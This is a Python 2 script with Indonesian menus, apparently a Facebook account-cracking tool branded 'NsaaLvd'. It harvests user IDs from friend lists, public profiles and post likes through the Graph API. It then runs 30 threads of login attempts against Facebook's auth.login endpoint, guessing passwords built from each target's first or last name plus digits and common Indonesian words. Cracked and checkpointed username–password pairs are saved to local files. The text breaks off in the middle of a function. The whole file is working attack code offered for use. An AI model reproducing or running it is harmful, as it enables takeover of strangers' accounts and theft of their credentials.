#!/usr/bin/python2
#coding=utf-8

import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool

#### WARNA RANDOM ####
P  = '\033[1;97m'  # putih
M  = '\033[1;91m' # merah
H  = '\033[1;92m' # hijau
K = '\033[1;93m' # kuning
B  = '\033[1;94m' # biru
U  = '\033[1;95m' # ungu
O = '\033[1;96m' # biru muda

my_color = [P, M, H, K, B, U, O]
warna = random.choice(my_color)
warni = random.choice(my_color)

try:
    import requests
    import mechanize
except ImportError:
    os.system("pip2 install requests")
    os.system("pip2 install mechanize")
    os.system("python2 .login.py")
    
from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
reload(sys)

sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
session = requests.Session()
session.headers.update({'User-Agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'})

os.system("clear")
done = False
def animate():
    for c in itertools.cycle(['\033[1;32m|', '\033[1;36m/', '\033[1;35m-', '\033[1;31m\\']):
        if done:
            break
        sys.stdout.write('\r\033[1;31mNsaaLvd:)\n\033[1;34mTunggu sebentar sob ' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c )
        sys.stdout.flush()
        time.sleep(0.1)
 
t = threading.Thread(target=animate)
t.start()
 
time.sleep(5)
done = True

def exb():
  print ("Keluar [!]")
  os.sys.exit()

def rf(str,n):
    rmf=str[n:]
    return rmf
    
def pf(str,n):
    prf=str[:n]
    return prf
    
def psb(z):
  for e in z + "\n":
    sys.stdout.write(e)
    sys.stdout.flush()
    time.sleep(0.03)

def t():
    time.sleep(1)
    
def cb():
    os.system("clear")

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
##### LOGO #####
logo="""\033[1;34m──────────────────────────────────────────────────
\033[1;36m          ▄▀▀▄ ▀▄  ▄▀▀▀▀▄  ▄▀▀█▄   ▄▀▀█▄
         █  █ █ █ █ █   ▐ ▐ ▄▀ ▀▄ ▐ ▄▀ ▀▄
         ▐  █  ▀█    ▀▄     █▄▄▄█   █▄▄▄█
\033[1;34m           █   █  ▀▄   █   ▄▀   █  ▄▀   █
\033[1;31m▄ ▄\033[1;34m      ▄▀   █    █▀▀▀   █   ▄▀  █   ▄▀      \033[1;31m▄ ▄
\033[1;34m         ▐    ▐    ▐      ▐   ▐   ▐   ▐
\033[1;34m──────────────────────────────────────────────────
\033[1;33m  ▼￣＞-―-＜￣▼ \033[1;36m   WhatsApp\033[0m   :\033[1;31m  089614402xxx
\033[1;33m   Ｙ　     Ｙ   \033[1;34m    Author\033[0m   :\033[1;33m  CastaliaIkz...
\033[1;33m/\ /   \033[1;31m●\033[1;33m  ω \033[1;31m●\033[1;33m） \033[1;35m  Instagram\033[0m   :\033[1;34m  kz_206
\033[1;33m\ ｜　 つ　  ヽつ \033[1;31m Facebook\033[0m   :\033[1;36m  Bagaskurniawan Ex\033[0m
\033[1;34m──────────────────────────────────────────────────\033[0m"""

def tik():
  titik = [".   ","..  ","... "]
  for o in titik:
    print("\r[●] Loging In "+o),;sys.stdout.flush();time.sleep(1)


back = 0
successful = []
cpb = []
oks = []
threads = []
cekpoint = []
oks = []
gagal = [] 
idteman = []
idfromteman = []
idmem = []
emmem = []
nomem = []
id = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

def menu():
  os.system("clear")
  try:
    toket=open(".token.txt","r").read()
  except IOError:
    os.system("clear")
    print("~ Token Kadaluarsa ~")
    os.system("rm -rf .token.txt")
    time.sleep(1)
    os.system("python2 .Nsaalvd.py")
  try:
    otw = session.get("https://graph.facebook.com/me?access_token="+toket)
    a = json.loads(otw.text)
    name = a["name"]
    id = a["id"]
  except KeyError:
    os.system("clear")
    print("[!] Sepertinya token telah kadaluarsa")
    os.system("rm -rf .token.txt")
    time.sleep(8)
    os.system("python2 menu.py")
  except requests.exceptions.ConnectionError:
    print("[!] Tidak ada koneksi internet")
    exb()
  os.system("clear")
  print(logo)
  print ("\033[1;33m Login Sebagai")
  print ("\033[1;32m Nama Akun\033[1;31m :\033[1;32m "+name)
  print("\033[1;32m ID Akun\033[1;31m   :\033[1;32m "+id)
  print ("\033[1;34m──────────────────────────────────────────────────")
  print ("\033[1;31m{\033[0m01\033[1;31m}\033[1;36m Crack Akun") 
  print ("\033[1;31m{\033[0m02\033[1;31m}\033[1;36m Dump Email / ID")
  print ("\033[1;31m{\033[0m03\033[1;31m}\033[1;35m Credit Script")
  print ("\033[1;31m{\033[0m04\033[1;31m}\033[1;36m Update NsaaLvd Tool")
  print ("\033[1;31m{\033[0m05\033[1;31m}\033[1;36m Logout Token")
  print ("\033[1;31m{\033[1;32m00\033[1;31m}\033[1;36m Exit\033[0m            ")
  print ("\033[1;34m──────────────────────────────────────────────────\033[0m")
  action()


def action():
  chb = raw_input("\033[1;31m  ︻デ\033[0m═一▸   \033[1;31m: \033[0m")
  if chb =="":
    print ("Pilihan salah")
    action()
  elif chb =="1":
      crack_menu()
  elif chb =="2":
      dump()
  elif chb =="3":
    os.system('python2 .about.py')
  elif chb =="4":
      os.system("pip2 install --upgrade NsaaLvd")
      cb()
      print (logo)
      psb("10%")
      psb("20%")
      psb("30%")
      psb("40%")
      psb("50%")
      psb("60%")
      psb("70%")
      psb("80%")
      psb("90%")
      psb("100%")
      psb("✓")
      psb("✓")
      psb("✓")
      psb("\033[1;33mTools Telah Di Update\033[0m")
      time.sleep(2)
      menu()
  elif chb =="5":
      os.system("rm -rf .token.txt")
      print
      psb(" Logout Selesai")
  elif chb =="0":
    exb()
  else:
    print ("Pilihan Salah")
    action()


def crack_menu():
  global toket
  os.system("clear")
  try:
    toket=open(".token.txt","r").read()
  except IOError:
    print("~ Token Kadaluarsa ~")
    os.system("rm -rf .token.txt")
    time.sleep(1)
    os.system("python2 .Nsaalvd.py")
  print (logo)
  print ("\033[1;31m{\033[0m01\033[1;31m}\033[1;36m Crack Dari Daftar Teman")
  print ("\033[1;31m{\033[0m02\033[1;31m}\033[1;36m Crack Dari ID Publik")
  print ("\033[1;31m{\033[0m03\033[1;31m}\033[1;36m Crack Dari Total Followers")
  print ("\033[1;31m{\033[0m04\033[1;31m}\033[1;36m Crack Dari Like Postingan")
  print ("\033[1;31m{\033[0m05\033[1;31m}\033[1;36m Buat File ID")
  print ("\033[1;31m{\033[1;32m00\033[1;31m}\033[1;36m Kembali Ke Menu\033[0m")
  print ("\033[1;34m──────────────────────────────────────────────────\033[0m")
  crack_action()

def crack_action():
  bch = raw_input("\033[1;31m  ︻デ═\033[0m一▸   \033[1;31m: \033[0m")
  if bch =="":
    print ("Pilihan salah")
    crack_action()
  elif bch =="1":
    os.system("clear")
    print (logo)
    print ("         \033[1;95m=>> \033[1;36mNsaaLvd Daftar Teman Crack \033[1;95m<===")
    print 50* "\033[1;94m─"
    r = session.get("https://graph.facebook.com/me/friends?access_token="+toket)
    z = json.loads(r.text)
    for s in z["data"]:
      id.append(s["id"])
  elif bch =="2":
    os.system("clear")
    print (logo)
    idt = raw_input("\033[1;35m{\033[1;31m•\033[1;35m}\033[1;36m Masukan ID : \033[0m")
    os.system("clear")
    print (logo)
    try:
      jok = session.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
      op = json.loads(jok.text)
      print ("        \033[1;95m=>> \033[1;32mNsaaLvd Akun Publik Crack \033[1;95m<===")
      print 50* "\033[1;94m─"
      psb("\033[1;35m{\033[1;32m•\033[1;35m}\033[1;36m Nama Akun  \033[;31m: \033[1;32m"+op["name"])
      time.sleep(0.5)
    except KeyError:
      print("\033[1;35m{\033[1;35m!\033[1;35m}\033[1;31m ID Tidak Ada\033[0m ")
      raw_input("\n\033[1;35m{\033[1;35m✓\033[1;35m}\033[1;36mKembali")
      crack_menu()
    r = session.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
    z = json.loads(r.text)
    for i in z["data"]:
      id.append(i["id"])
  elif bch =="5":
    os.system("clear")
    print (logo)
    print ("        \033[1;95m=>> \033[1;32mNsaaLvd File Crack \033[1;95m<===")
    print 50* "\033[1;94m─"
    try:
      idlist = raw_input("\033[1;35m{\033[1;35m>\033[1;35m}\033[1;36m Masukan File ID \033[1;31m: \033[0m")
      for line in open(idlist,"r").readlines():
        id.append(line.strip())
    except IOError:
      print ("\033[1;35m{\033[1;35m!\033[1;35m}\033[1;31m File Tidak Ditemukan\033[0m")
      raw_input("\n\033[1;35m{\033[1;35m✓\033[1;35m}\033[1;36mKembali\033[0m")
      crack_menu()
  elif bch =="3":
    crack_follow()
  elif bch =="4":
    crack_likes()
  elif bch =="0":
    menu()
  else:
    print ("\033[1;35m{\033[1;31m!\033[1;35m}\033[1;36mPilihan Salah")
    crack_action()
  xxx = str(len(id))
  psb ("\033[1;35m{\033[1;31m-\033[1;35m}\033[1;36m Total ID   \033[1;31m:\033[1;32m "+xxx)
  time.sleep(0.5)
  psb ("\033[1;35m{\033[1;31m∆\033[1;35m}\033[1;36m Proses Crack Sedang Berlangsung...")
  time.sleep(0.5)
  psb ("\033[1;35m{\033[1;31m×\033[1;35m}\033[1;36m Tekan CTRL + Z Untuk Berhenti")
  time.sleep(0.5)
  print ("\033[1;34m──────────────────────────────────────────────────\033[0m")
  print
  
      
  def main(arg):
    global cpb,oks
    user = arg
    try:
      a = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
      b = json.loads(a.text)
      d=b["first_name"]
      e=d.replace(" ", "")
      f=e.lower()
      g=pf(f, 1)
      h=g.upper()
      i=rf(f, 1)
      c=h+i
      pass1 = "anjing"
      data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
      q = json.load(data)
      if "access_token" in q:
        print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass1
        oks.append(user+pass1)
      else:
        if "www.facebook.com" in q["error_msg"]:
          print "\033[1;31mCheckpoint "
          print "\033[1;33mNama Akun : "+b['name']
          print "ID Akun   : "+user
          print "Password  : "+pass1 + '\n'
          cps = open("checkpoint.txt", "a")
          cps.write(user+"|"+pass1+"\n")
          cps.close()
          cpb.append(user+pass1)
        else:
          pass2 = c + "123456"
          data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
          q = json.load(data)
          if "access_token" in q:
            print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass2
            oks.append(user+pass2)
          else:
            if "www.facebook.com" in q["error_msg"]:
              print "\033[1;31mCheckpoint "
              print "\033[1;33mNama Akun : "+b['name']
              print "ID Akun   : "+user
              print "Password  : "+pass2 + '\n'
              cps = open("checkpoint.txt", "a")
              cps.write(user+"|"+pass2+"\n")
              cps.close()
              cpb.append(user+pass2)
            else:
              pass3 = c + "12345"
              data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
              q = json.load(data)
              if "access_token" in q:
                print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass3
                oks.append(user+pass3)
              else:
                if "www.facebook.com" in q["error_msg"]:
                  print "\033[1;31mCheckpoint "
                  print "\033[1;33mNama Akun : "+b['name']
                  print "ID Akun   : "+user
                  print "Password  : "+pass3 + '\n'
                  cps = open("checkpoint.txt", "a")
                  cps.write(user+"|"+pass3+"\n")
                  cps.close()
                  cpb.append(user+pass3)
                else:
                  pass4 = c + "1234"
                  data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                  q = json.load(data)
                  if "access_token" in q:
                   print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass4
                   oks.append(user+pass4)
                  else:
                    if "www.facebook.com" in q["error_msg"]:
                      print "\033[1;31mCheckpoint "
                      print "\033[1;33mNama Akun : "+b['name']
                      print "ID Akun   : "+user
                      print "Password  : "+pass4 + '\n'
                      cps = open("checkpoint.txt", "a")
                      cps.write(user+"|"+pass4+"\n")
                      cps.close()
                      cpb.append(user+pass4)
                    else:
                      pass5 = c + "123"
                      data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                      q = json.load(data)
                      if "access_token" in q:
                        print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass5
                        oks.append(user+pass5)
                      else:
                        if "www.facebook.com" in q["error_msg"]:
                          print "\033[1;31mCheckpoint "
                          print "\033[1;33mNama Akun : "+b['name']
                          print "ID Akun   : "+user
                          print "Password  : "+pass5 + '\n'
                          cps = open("checkpoint.txt", "a")
                          cps.write(user+"|"+pass5+"\n")
                          cps.close()
                          cpb.append(user+pass5)
                        else:
                          pass6 = "123456"
                          data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                          q = json.load(data)
                          if "access_token" in q:
                            print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass6
                            oks.append(user+pass6)
                          else:
                            if "www.facebook.com" in q["error_msg"]:
                              print "\033[1;31mCheckpoint "
                              print "\033[1;33mNama Akun : "+b['name']
                              print "ID Akun   : "+user
                              print "Password  : "+pass6 + '\n'
                              cps = open("checkpoint.txt", "a")
                              cps.write(user+"|"+pass6+"\n")
                              cps.close()
                              cpb.append(user+pass6)
                            else:
                              pass7 = c + "11"
                              data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                              q = json.load(data)
                              if "access_token" in q:
                                print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass7
                                oks.append(user+pass7)
                              else:
                                if "www.facebook.com" in q["error_msg"]:
                                  print "\033[1;31mCheckpoint "
                                  print "\033[1;33mNama Akun : "+b['name']
                                  print "ID Akun   : "+user
                                  print "Password  : "+pass7 + '\n'
                                  cps = open("checkpoint.txt", "a")
                                  cps.write(user+"|"+pass7+"\n")
                                  cps.close()
                                  cpb.append(user+pass7)
                                else:
                                  pass8 = c + "321"
                                  data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass8 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                  q = json.load(data)
                                  if "access_token" in q:
                                   print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass8
                                   oks.append(user+pass8)
                                  else:
                                    if "www.facebook.com" in q["error_msg"]:
                                      print "\033[1;31mCheckpoint "
                                      print "\033[1;33mNama Akun : "+b['name']
                                      print "ID Akun   : "+user
                                      print "Password  : "+pass8 + '\n'
                                      cps = open("checkpoint.txt", "a")
                                      cps.write(user+"|"+pass8+"\n")
                                      cps.close()
                                      cpb.append(user+pass8)
                                    else:
                                      pass9 = "bangsat"
                                      data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass9 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                      q = json.load(data)
                                      if "access_token" in q:
                                       print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass9
                                       oks.append(user+pass9)
                                      else:
                                        if "www.facebook.com" in q["error_msg"]:
                                          print "\033[1;31mCheckpoint "
                                          print "\033[1;33mNama Akun : "+b['name']
                                          print "ID Akun   : "+user
                                          print "Password  : "+pass9 + '\n'
                                          cps = open("checkpoint.txt", "a")
                                          cps.write(user+"|"+pass9+"\n")
                                          cps.close()
                                          cpb.append(user+pass9)
                                        else:
                                          pass10 = "sayang"
                                          data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass10 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                          q = json.load(data)
                                          if "access_token" in q:
                                           print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass10
                                           oks.append(user+pass10)
                                          else:
                                            if "www.facebook.com" in q["error_msg"]:
                                              print "\033[1;31mCheckpoint "
                                              print "\033[1;33mNama Akun : "+b['name']
                                              print "ID Akun   : "+user
                                              print "Password  : "+pass10 + '\n'
                                              cps = open("checkpoint.txt", "a")
                                              cps.write(user+"|"+pass10+"\n")
                                              cps.close()
                                              cpb.append(user+pass10)
                                            else:
                                               pass11 = "sayangkamu"
                                               data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass11 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                               q = json.load(data)
                                               if "access_token" in q:
                                                print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass11
                                                oks.append(user+pass11)
                                               else:
                                                 if "www.facebook.com" in q["error_msg"]:
                                                   print "\033[1;31mCheckpoint "
                                                   print "\033[1;33mNama Akun : "+b['name']
                                                   print "ID Akun   : "+user
                                                   print "Password  : "+pass11 + '\n'
                                                   cps = open("checkpoint.txt", "a")
                                                   cps.write(user+"|"+pass11+"\n")
                                                   cps.close()
                                                   cpb.append(user+pass11)
                                                 else:
                                                    pass12 = b["last_name"]+"123"
                                                    data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass12 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                    q = json.load(data)
                                                    if "access_token" in q:
                                                     print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass12
                                                     oks.append(user+pass12)
                                                    else:
                                                      if "www.facebook.com" in q["error_msg"]:
                                                        print "\033[1;31mCheckpoint "
                                                        print "\033[1;33mNama Akun : "+b['name']
                                                        print "ID Akun   : "+user
                                                        print "Password  : "+pass12 + '\n'
                                                        cps = open("checkpoint.txt", "a")
                                                        cps.write(user+"|"+pass12+"\n")
                                                        cps.close()
                                                        cpb.append(user+pass12)
                                                      else:
                                                        pass13 = b["last_name"]+"1234"
                                                        data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass13 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                        q = json.load(data)
                                                        if "access_token" in q:
                                                         print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass13
                                                         oks.append(user+pass13)
                                                        else:
                                                          if "www.facebook.com" in q["error_msg"]:
                                                            print "\033[1;31mCheckpoint "
                                                            print "\033[1;33mNama Akun : "+b['name']
                                                            print "ID Akun   : "+user
                                                            print "Password  : "+pass13 + '\n'
                                                            cps = open("checkpoint.txt", "a")
                                                            cps.write(user+"|"+pass13+"\n")
                                                            cps.close()
                                                            cpb.append(user+pass13)
                                                          else:
                                                            pass14 = b["last_name"]+"12345"
                                                            data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass14 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                            q = json.load(data)
                                                            if "access_token" in q:
                                                             print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass14
                                                             oks.append(user+pass13)
                                                            else:
                                                              if "www.facebook.com" in q["error_msg"]:
                                                                print "\033[1;31mCheckpoint "
                                                                print "\033[1;33mNama Akun : "+b['name']
                                                                print "ID Akun   : "+user
                                                                print "Password  : "+pass14 + '\n'
                                                                cps = open("checkpoint.txt", "a")
                                                                cps.write(user+"|"+pass14+"\n")
                                                                cps.close()
                                                                cpb.append(user+pass14)
                                                              else:
                                                                pass15 = b["last_name"]+"123456"
                                                                data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass15 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                q = json.load(data)
                                                                if "access_token" in q:
                                                                 print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass15
                                                                 oks.append(user+pass15)
                                                                else:
                                                                  if "www.facebook.com" in q["error_msg"]:
                                                                    print "\033[1;31mCheckpoint "
                                                                    print "\033[1;33mNama Akun : "+b['name']
                                                                    print "ID Akun   : "+user
                                                                    print "Password  : "+pass15 + '\n'
                                                                    cps = open("checkpoint.txt", "a")
                                                                    cps.write(user+"|"+pass15+"\n")
                                                                    cps.close()
                                                                    cpb.append(user+pass15)
                                                                  else:
                                                                    pass16 = b["last_name"]+"321"
                                                                    data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass16 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                    q = json.load(data)
                                                                    if "access_token" in q:
                                                                     print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass16
                                                                     oks.append(user+pass16)
                                                                    else:
                                                                      if "www.facebook.com" in q["error_msg"]:
                                                                        print "\033[1;31mCheckpoint "
                                                                        print "\033[1;33mNama Akun : "+b['name']
                                                                        print "ID Akun   : "+user
                                                                        print "Password  : "+pass16 + '\n'
                                                                        cps = open("checkpoint.txt", "a")
                                                                        cps.write(user+"|"+pass16+"\n")
                                                                        cps.close()
                                                                        cpb.append(user+pass16)
                                                                      else:
                                                                        pass17 = "kontol"
                                                                        data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass17 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                        q = json.load(data)
                                                                        if "access_token" in q:
                                                                         print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass17
                                                                         oks.append(user+pass17)
                                                                        else:
                                                                          if "www.facebook.com" in q["error_msg"]:
                                                                            print "\033[1;31mCheckpoint "
                                                                            print "\033[1;33mNama Akun : "+b['name']
                                                                            print "ID Akun   : "+user
                                                                            print "Password  : "+pass17 + '\n'
                                                                            cps = open("checkpoint.txt", "a")
                                                                            cps.write(user+"|"+pass17+"\n")
                                                                            cps.close()
                                                                            cpb.append(user+pass17)

    except:
      pass
    
  p = ThreadPool(30)
  p.map(main, id)
  print ("\033[1;34m──────────────────────────────────────────────────\033[0m")
  print ("\033[1;35m{\033[1;31m✓\033[1;35m}\033[1;36mCrack Selesai")
  print ("[✓] Total \033[1;32mOK\033[1;31m/\033[1;33mCP\033[1;36m : "+str(len(oks))+"/"+str(len(cpb)))
  print("\033[1;35m{\033[1;31m×\033[1;35m}\033[1;36m Akan Di Save Di : \033[1;31mCheckpoint.txt")
  raw_input("\033[1;35m{\033[1;31m×\033[1;35m}\033[1;36m Kembali\033[0m")
  if xxx == "0":
    crack_menu()
  else:
    os.system("python2 .Nsaalvd.py")

##### CRACK LIKES #####
def crack_likes():
	os.system('clear')
	try:
		toket=open('.token.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf .token.txt')
		time.sleep(0.01)
		login()
	try:
		os.system('clear')
		print logo
                print ("        \033[1;95m=>> \033[1;32mNsaaLvd Total Likes Crack \033[1;95m<===")
                print 50* "\033[1;94m─"
		tez = raw_input("\033[1;35m{\033[1;31m?\033[1;35m}\033[1;36m ID Postingan \033[1;91m :\033[1;32m ")
		r = requests.get("https://graph.facebook.com/"+tez+"/likes?limit=9999999&access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
		jalan('\r\033[1;35m{\033[1;31m÷\033[1;35m} \033[1;36mMengambil ID \033[1;97m...')
	except KeyError:
		print"\033[1;97m{\033[1;91m!\033[1;97m} ID Postingan Salah !"
		raw_input("\n\033[1;35m[<\033[1;31mKembali>\033[1;35m]")
		menu()
		
	print "\033[1;35m{\033[1;31m✓\033[1;35m} \033[1;36mTotal ID \033[1;91m:\033[1;32m "+str(len(id))
	print('\033[1;35m{\033[1;31m×\033[1;35m} \033[1;36mStop Tekan CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;35m{\033[1;31m#\033[1;35m} \033[1;96mCrack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print("\n\033[1;35m{\033[1;31m^\033[1;35m} \033[1;96mGunakan Mode Pesawat Jika Tidak Ada Hasil")
	print ("\033[1;94m──────────────────────────────────────────────────")
	
##### MAIN LIKES #####
	def main(arg):
		sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
		global cekpoint,oks
		zowe = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;32mSUCCESS")
				print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
	                        print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
				print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos1
				oke = open("done/likes.txt", "a")
				oke.write("\n{✓} BERHASIL \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;31mCHEKPOINT")
					print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
					print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
					print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos1
					cek = open("done/likes.txt", "a")
					cek.write("\n{×} CEKPOINT \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
